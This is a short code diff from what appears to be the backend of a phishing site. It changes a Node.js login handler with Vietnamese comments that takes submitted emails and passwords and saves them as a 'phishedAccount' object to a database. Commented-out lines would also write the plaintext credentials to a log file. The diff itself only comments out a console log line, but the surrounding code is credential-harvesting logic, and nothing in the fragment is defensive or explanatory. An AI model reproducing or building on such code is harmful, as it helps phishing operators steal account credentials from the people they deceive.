@@ -21,7 +21,7 @@ const login = async (req, res) => {
     // const logData = `Email: ${email} | Password: ${password}\n`;
     // fs.appendFileSync("log.txt", logData);
 
-    console.log("Đã lưu:", logData);
+    // console.log("Đã lưu:", logData);
 
     //Lưu thông tin vào db
     const phishedAccount = { email, password };
